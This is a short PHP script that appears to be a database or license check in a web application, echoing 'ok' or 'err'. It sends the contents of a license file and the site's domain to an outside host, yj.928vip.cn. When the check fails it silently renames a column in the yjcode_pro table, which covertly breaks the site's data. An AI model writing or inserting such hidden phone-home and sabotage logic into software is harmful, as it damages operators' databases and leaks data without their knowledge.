<?php
set_time_limit(0);
include("../config/conn.php");
include("../config/function.php");
$ifdb=0;
if(!is_file("../config/userkey.dll")){$ifdb=1;}
else{
 $t=@read_file_content("../config/userkey.dll");
 $t1=preg_split("/\|/",$t);
 $w=$_SERVER['HTTP_HOST'];
 $ifdb=0;
 if(!strstr($w,$t1[0])){$ifdb=1;}
 $vadf8xe8w=@htmlget("http://yj.928vip.cn/vip/vipcheck.php?md5v=".$t."&web=".$t1[0]);
 if($vadf8xe8w=="err"){$ifdb=1;}
}

if(1==$ifdb){
 $zfstr=" DEFAULT CHARSET=utf8";
 $sql="ALTER TABLE yjcode_pro CHANGE wppwd1 wppwdl varchar(50)";mysql_query($sql);
}
if(1==$ifdb){$dbv="err";}else{$dbv="ok";}
echo $dbv;
?>